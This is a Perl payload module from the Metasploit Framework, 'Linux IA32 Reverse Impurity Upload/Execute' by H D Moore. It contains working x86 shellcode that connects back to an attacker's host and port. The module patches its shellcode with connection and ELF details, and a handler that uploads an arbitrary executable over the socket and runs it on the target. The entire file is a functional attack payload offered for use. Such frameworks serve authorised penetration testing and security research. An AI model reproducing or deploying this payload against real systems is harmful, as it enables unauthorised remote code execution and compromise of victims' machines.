
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_ia32_reverse_impurity;
use strict;
use base 'Msf::PayloadComponent::ReverseConnection';

my $info =
{
  'Name'         => 'Linux IA32 Reverse Impurity Upload/Execute',
  'Version'      => '$Revision$',
  'Description'  => 'Connect back to attacker and download impurity module',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => '',
  'UserOpts'     =>
    {
      'PEXEC' => [1, 'PATH', 'The path to the payload executable'],
    }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate($self->GetVar('LHOST'), $self->GetVar('LPORT'), $self->GetVar('PEXEC')));
}

sub Generate {
  local *X;
  my $self = shift;
  my $host = shift;
  my $port = shift;
  my $pexec = shift;

  my $off_port = 26;
  my $port_bin = pack('n', $port);


  my $off_host = 19;
  my $host_bin = gethostbyname($host);

  # executable size
  my $size =  -s $pexec;
  my $off_size = 63;

  # allocation size
  my $mall = pack('V', $size * 4);
  my $off_mall = 76;
  
  $size = pack('V', $size);

  # elf start address
  my $start = pack('V', 0x13370074);
  if (open(X, "<$pexec"))
  {
      my $elf;
      read(X, $elf, 128);
      $start = substr($elf, 0x18, 4);
      close(X);
  }

  my $shellcode = 
  "\x89\xe5\x31\xc0\x31\xdb\x43\x50\x40\x50\x40\x50\x89\xe1\xb0\x66".
  "\xcd\x80\x68\x7f\x00\x00\x01\x68\x02\x00\x22\x11\x89\xe1\x6a\x10".
  "\x51\x50\x89\xe1\x50\x31\xc0\xb0\x66\xb3\x03\xcd\x80\x85\xc0\x78".
  "\x4e\x4b\x89\xd9\x31\xc0\x5b\xb0\x3f\xcd\x80\x49\x79\xf9\xba\x78".
  "\x56\x34\x12\x31\xc9\x51\x51\x6a\x32\x6a\x07\x68\x44\x33\x22\x11".
  "\x68\x00\x00\x37\x13\x89\xe3\x31\xc0\xb0\x5a\xcd\x80\x89\xc1\x31".
  "\xdb\x89\xd8\xb0\x03\xcd\x80\x85\xc0\x7e\x14\x29\xc2\x01\xc1\x85".
  "\xd2\x75\xee\x52\x52\x54\x42\x52\x4a\x68\x74\x00\x37\x13\xc3\x6a".
  "\x01\x58\xcd\x80";
  
  substr($shellcode, 122, 4, $start);
  substr($shellcode, $off_port, 2, $port_bin);
  substr($shellcode, $off_host, 4, $host_bin);
  substr($shellcode, $off_size, 4, $size);
  substr($shellcode, $off_mall, 4, $mall);
  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('127.0.0.1', '4444',  $self->ScriptPath);
  return(length($bin));
}

sub HandleConnection {
  my $self = shift;
  $self->SUPER::HandleConnection;
  my $sock = $self->PipeRemoteOut;
  my $blocking = $sock->blocking;

  if(!open(INFILE, '<' . $self->GetVar('PEXEC'))) {
    $self->PrintLine('[*] Could not open path to impurity file.');
    $self->KillChild;
    return;
  }

  local $/;
  my $upload = <INFILE>;
  close(INFILE);

  $sock->blocking(1);

  $self->PrintLine('[*] Sleeping before sending impurity data.');
  sleep(2);

  $self->PrintLine('[*] Uploading impurity data (' . length($upload) . '), Please wait...');
  $sock->send($upload);
  $self->PrintLine('[*] Executing impurity data.');

  $sock->blocking($blocking);
}

1;
